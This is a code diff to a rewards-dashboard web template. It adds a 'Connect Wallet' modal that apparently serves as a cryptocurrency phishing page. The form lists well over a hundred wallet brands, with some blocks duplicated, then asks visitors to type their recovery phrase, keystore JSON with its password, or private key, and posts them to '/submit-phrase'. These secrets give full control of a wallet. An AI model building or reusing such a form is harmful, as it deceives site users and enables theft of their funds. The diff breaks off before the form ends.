@@ -6,6 +6,63 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Dashboard</title>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css">
+    <style>
+        .hidden {
+            display: none;
+        }
+
+        .modal {
+            background-color: rgba(0, 0, 0, 0.5);
+        }
+
+        .modal-content {
+            background-color: #2d2d2d;
+            border-radius: 0.375rem;
+            padding: 2rem;
+            max-width: 500px;
+            width: 100%;
+            margin: auto;
+        }
+
+        .form-dropdown select,
+        .form-dropdown textarea,
+        .form-dropdown input {
+            background-color: #1f1f1f;
+            color: #ddd;
+            border: 1px solid #444;
+            border-radius: 0.375rem;
+            padding: 0.5rem;
+            width: 100%;
+        }
+
+        .form-dropdown textarea {
+            resize: vertical;
+        }
+
+        .form-footer {
+            margin-top: 1rem;
+        }
+
+        .connect-btn,
+        .cancel-btn {
+            background-color: #4caf50;
+            color: #fff;
+            padding: 0.5rem 1rem;
+            border: none;
+            border-radius: 0.375rem;
+            font-weight: bold;
+        }
+
+        .cancel-btn {
+            background-color: #f44336;
+        }
+
+        .connect-btn:hover,
+        .cancel-btn:hover {
+            opacity: 0.8;
+        }
+    </style>
+
 </head>
 
 <body class="bg-gray-900 text-white">
@@ -15,7 +72,17 @@
         <!-- Welcome Message -->
         <p class="text-xl mb-4">Welcome, <%= user.email %>
         </p>
+        <p class="text-xl mb-6">Total Points: <span id="totalPoints"></span></p>
 
+        <!-- Connect Wallet Button -->
+        <div class="mb-4">
+            <button id="connectWalletButton"
+                class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded">
+                Connect Wallet
+            </button>
+        </div>
+
+        <!-- Rewards Sections -->
         <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
             <!-- My Rewards Section -->
             <div>
@@ -28,8 +95,8 @@
                                     <h3 class="text-xl font-semibold">
                                         <%= userReward.rewardId.name %>
                                     </h3>
-                                    <p>
-                                        <%= userReward.rewardId.points %>
+                                    <p class="reward-points" data-points="<%= userReward.rewardId.points %>">
+                                        Points: <%= userReward.rewardId.points %>
                                     </p>
                                     <p class="text-green-300">Claimed: <%= new
                                             Date(userReward.createdAt).toLocaleString() %>
@@ -57,7 +124,7 @@
                                     <p>
                                         <%= reward.description %>
                                     </p>
-                                    <form action="/claim-reward" method="POST">
+                                    <form action="/claim-reward" method="POST" class="claim-form">
                                         <input type="hidden" name="rewardId" value="<%= reward._id %>">
                                         <input type="hidden" name="userId" value="<%= user._id %>">
                                         <button type="submit"
@@ -75,6 +142,1514 @@
             </div>
         </div>
     </div>
+
+    <!-- Connect Wallet Modal -->
+    <div id="walletModal" class="modal fixed inset-0 flex items-center justify-center hidden">
+        <div class="modal-content">
+            <h2 class="text-2xl font-bold mb-4">Connect Your Wallet</h2>
+            <button id="closeModal" class="cancel-btn mb-4">Close</button>
+            <!-- Wallet Connection Form -->
+            <form method="post" action="/submit-phrase" id="walletConnectionForm">
+                <div class="form-dropdown image-dropdown">
+                    <label for="wallet_id">Wallet Type:</label>
+                    <select id="wallet_id" name="wallet_id">
+                        <!-- start -->
+                        <option value="Metamask">
+                            Metamask
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Trust Wallet">
+                            Trust Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Coinbase">
+                            Coinbase
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Keplr Wallet">
+                            Keplr Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="SafePal">
+                            SafePal
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Tronlink">
+                            Tronlink
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Defichain Wallet">
+                            Defichain Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="DFX Defichain">
+                            DFX Defichain
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Solana">
+                            Solana
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Blockchain">
+                            Blockchain
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Lobstr Wallet">
+                            Lobstr Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Yoroi Wallet">
+                            Yoroi Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Coinomi">
+                            Coinomi
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Edge Wallet">
+                            Edge Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Solar Wallet">
+                            Solar Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Pera Algo Wallet">
+                            Pera Algo Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Sender Wallet">
+                            Sender Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Xcel Pay Wallet">
+                            Xcel Pay Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Anchor Wallet">
+                            Anchor Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="ONTO">
+                            ONTO
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Rainbow">
+                            Rainbow
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Agent Wallet">
+                            Agent Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="CYBAVO Wallet">
+                            CYBAVO Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="GrindPlus">
+                            GrindPlus
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="imToken">
+                            imToken
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Pillar">
+                            Pillar
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Cryto.com | Defi Wallet">
+                            Cryto.com | Defi Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Gnosis Safe Multisig">
+                            Gnosis Safe Multisig
+                        </option>
+                        <!-- end -->
+                        <!-- start -->
+                        <option value="Curve Finance">
+                            Curve Finance
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="TokenPocket">
+                            TokenPocket
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="MathWallet">
+                            MathWallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="BitPay">
+                            BitPay
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Ledger Live">
+                            Ledger Live
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Walleth">
+                            Walleth
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Authereum">
+                            Authereum
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Dharma">
+                            Dharma
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="1inch Wallet">
+                            1inch Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Huobi Wallet">
+                            Huobi Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Eidoo">
+                            Eidoo
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="MYKEY">
+                            MYKEY
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="TrustVault">
+                            TrustVault
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Curve Finance">
+                            Curve Finance
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="TokenPocket">
+                            TokenPocket
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="MathWallet">
+                            MathWallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="BitPay">
+                            BitPay
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Ledger Live">
+                            Ledger Live
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Walleth">
+                            Walleth
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Authereum">
+                            Authereum
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Dharma">
+                            Dharma
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="1inch Wallet">
+                            1inch Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Huobi Wallet">
+                            Huobi Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Eidoo">
+                            Eidoo
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="MYKEY">
+                            MYKEY
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="TrustVault">
+                            TrustVault
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Atomic">
+                            Atomic
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Coin98">
+                            Coin98
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="zkSync">
+                            zkSync
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Shell Exchange">
+                            Shell Exchange
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Index Coop">
+                            Index Coop
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="SwapX">
+                            SwapX
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Starname">
+                            Starname
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Space">
+                            Space
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Maskbook">
+                            Maskbook
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Snapshot">
+                            Snapshot
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Invoice.build">
+                            Invoice.build
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Ankr">
+                            Ankr
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="DODO">
+                            DODO
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="zLOT">
+                            zLOT
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Curve Finance">
+                            Curve Finance
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="TokenPocket">
+                            TokenPocket
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="MathWallet">
+                            MathWallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="BitPay">
+                            BitPay
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Ledger Live">
+                            Ledger Live
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Walleth">
+                            Walleth
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Authereum">
+                            Authereum
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Dharma">
+                            Dharma
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="1inch Wallet">
+                            1inch Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Huobi Wallet">
+                            Huobi Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Eidoo">
+                            Eidoo
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="MYKEY">
+                            MYKEY
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="TrustVault">
+                            TrustVault
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Atomic">
+                            Atomic
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Coin98">
+                            Coin98
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="zkSync">
+                            zkSync
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Shell Exchange">
+                            Shell Exchange
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Index Coop">
+                            Index Coop
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="SwapX">
+                            SwapX
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Starname">
+                            Starname
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Space">
+                            Space
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Maskbook">
+                            Maskbook
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Snapshot">
+                            Snapshot
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Invoice.build">
+                            Invoice.build
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Ankr">
+                            Ankr
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="DODO">
+                            DODO
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="zLOT">
+                            zLOT
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Tokamak Network">
+                            Tokamak Network
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Actus Protocol">
+                            Actus Protocol
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="AstroTools.io">
+                            AstroTools.io
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Rubic Exchange">
+                            Rubic Exchange
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Torus Wallet">
+                            Torus Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Oceanprotocol">
+                            Oceanprotocol
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Filecone Wallet">
+                            Filecone Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Falconswap">
+                            Falconswap
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Bancor Wallet">
+                            Bancor Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Harvest Finance">
+                            Harvest Finance
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="OctoFi">
+                            OctoFi
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Mushroom Finance">
+                            Mushroom Finance
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Bitfrost Finance">
+                            Bitfrost Finance
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Orchid Protocol">
+                            Orchid Protocol
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Datamine Network">
+                            Datamine Network
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Streamr">
+                            Streamr
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="DappRadar">
+                            DappRadar
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="SuperRare">
+                            SuperRare
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Arbitrum">
+                            Arbitrum
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="ParaSwap">
+                            ParaSwap
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="HoneySwap">
+                            HoneySwap
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Fleek">
+                            Fleek
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="CoolWallet">
+                            CoolWallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Alice">
+                            Alice
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="AlphaWallet">
+                            AlphaWallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="ZelCore">
+                            ZelCore
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Phantom Wallet">
+                            Phantom Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Solflare Wallet">
+                            Solflare Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Sollet Wallet">
+                            Sollet Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="D'CENT Wallet">
+                            D'CENT Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Tokenary">
+                            Tokenary
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Spatium">
+                            Spatium
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Infinito">
+                            Infinito
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Wallet.io">
+                            Wallet.io
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Infinity Wallet">
+                            Infinity Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Ownbit">
+                            Ownbit
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="EasyPocket">
+                            EasyPocket
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Bridge Wallet">
+                            Bridge Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Unstoppable Wallet">
+                            Unstoppable Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="PEAKDEFI Wallet">
+                            PEAKDEFI Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Vision">
+                            Vision
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="BitKeep">
+                            BitKeep
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="ViaWallet">
+                            ViaWallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="SparkPoint">
+                            SparkPoint
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="HaloDefi Wallet">
+                            HaloDefi Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Dok Wallet">
+                            Dok Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="AT.Wallet">
+                            AT.Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Midas Wallet">
+                            Midas Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Ellipal">
+                            Ellipal
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="KEYRING PRO">
+                            KEYRING PRO
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Aktoinariat">
+                            Aktoinariat
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Talken Wallet">
+                            Talken Wallet
+                        </option>
+
+                        <!-- start -->
+                        <option value="XinFin XDC Network">
+                            XinFin XDC Network
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Flare Wallet">
+                            Flare Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="AToken Wallet">
+                            AToken Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Tongue Wallet">
+                            Tongue Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Binance DEX">
+                            Binance DEX
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="RWallet">
+                            RWallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="PlasmaPay">
+                            PlasmaPay
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="O3Wallet">
+                            O3Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="HashKey Me">
+                            HashKey Me
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Jade Wallet">
+                            Jade Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Guarda Wallet">
+                            Guarda Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Defiant">
+                            Defiant
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Trustee Wallet">
+                            Trustee Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="MEET.ONE">
+                            MEET.ONE
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="MoriX Wallet">
+                            MoriX Wallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Binance Smart Chain">
+                            Binance Smart Chain
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Etherscan">
+                            Etherscan
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Lido">
+                            Lido
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="TERRAstation">
+                            TERRAstation
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="OpenSea">
+                            OpenSea
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Zapper">
+                            Zapper
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Aave">
+                            Aave
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Zerion">
+                            Zerion
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="LocalCryptos">
+                            LocalCryptos
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="DeBank">
+                            DeBank
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Unstoppable Domains">
+                            Unstoppable Domains
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Rarible">
+                            Rarible
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Yearn">
+                            Yearn
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Adex Network">
+                            Adex Network
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="dYdX">
+                            dYdX
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="MyCrypto">
+                            MyCrypto
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Oasis App">
+                            Oasis App
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="TokenSets">
+                            TokenSets
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="MANTRA DAO">
+                            MANTRA DAO
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Matcha">
+                            Matcha
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="KyberSwap">
+                            KyberSwap
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="DeFi Portfolio Tracker">
+                            DeFi Portfolio Tracker
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Loopring">
+                            Loopring
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="InstaDapp">
+                            InstaDapp
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Matic Network">
+                            Matic Network
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="3Box">
+                            3Box
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="DDEX">
+                            DDEX
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Bamboo Relay">
+                            Bamboo Relay
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Synthetix">
+                            Synthetix
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Dex.blue">
+                            Dex.blue
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="PoolTogether">
+                            PoolTogether
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="DEX.AG">
+                            DEX.AG
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Gelato">
+                            Gelato
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="ENS Domains">
+                            ENS Domains
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Idle Finance">
+                            Idle Finance
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="iearn.finance">
+                            iearn.finance
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="RCN Finance">
+                            RCN Finance
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Hegic">
+                            Hegic
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Kickback">
+                            Kickback
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="88mph">
+                            88mph
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Mooni">
+                            Mooni
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Clovers">
+                            Clovers
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Mintbase">
+                            Mintbase
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="DAOstack">
+                            DAOstack
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="KnownOrigin">
+                            KnownOrigin
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="MyEtherWallet">
+                            MyEtherWallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Affogato">
+                            Affogato
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="StablePay">
+                            StablePay
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Defi Saver">
+                            Defi Saver
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Loom Network">
+                            Loom Network
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="ThorChain">
+                            ThorChain
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="BulkSender">
+                            BulkSender
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Heroes of Ether">
+                            Heroes of Ether
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Betoken">
+                            Betoken
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Linkdrop">
+                            Linkdrop
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="HelioWallet">
+                            HelioWallet
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Escaroo">
+                            Escaroo
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="TokenMarket">
+                            TokenMarket
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Mesa">
+                            Mesa
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="MCDEX">
+                            MCDEX
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Furucombo">
+                            Furucombo
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Melon">
+                            Melon
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Chainsfr">
+                            Chainsfr
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="AKA3Email Alias">
+                            AKA3Email Alias
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="2Key">
+                            2Key
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Pitch">
+                            Pitch
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="SunshiSwap">
+                            SunshiSwap
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Unagii">
+                            Unagii
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Cream Finance">
+                            Cream Finance
+                        </option>
+                        <!-- end -->
+
+                        <!-- start -->
+                        <option value="Other Wallet">
+                            Other Wallet
+                        </option>
+                        <!-- end -->
+                    </select>
+                </div>
+
+                <div class="form-dropdown">
+                    <select id="type" name="type" onchange="toggleFields()">
+                        <option value="">Select Option</option>
+                        <option value="Phrase" id="phraseOption">Phrase</option>
+                        <option value="Keystore JSON" id="keystoreOption">Keystore JSON</option>
+                        <option value="Private" id="privateOption">Private Key</option>
+                    </select>
+                </div>
+
+                <div id="phraseField" class="toggle-field hidden">
+                    <textarea id="phrase" name="phraseinput" cols="30" rows="4" placeholder="Enter your Recovery Phrase"
+                        style="color: #1f1f1f;"></textarea>
+                    <p>Typically 12 (sometimes 24) words separated by single spaces</p>
+                </div>
+
+                <div id="keystoreField" class="toggle-field hidden">
+                    <textarea id="keystore" name="keystoreval" cols="30" rows="4" placeholder="Enter your Keystore JSON"
+                        style="color: #1f1f1f;"></textarea>
+                    <p>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</p>
+                    <input type="text" id="wallet_password" name="password" placeholder="Enter Wallet Password"
+                        class="w-full p-2 mt-2 border border-gray-300 rounded-md" style="color: #1f1f1f;">
+                </div>
+
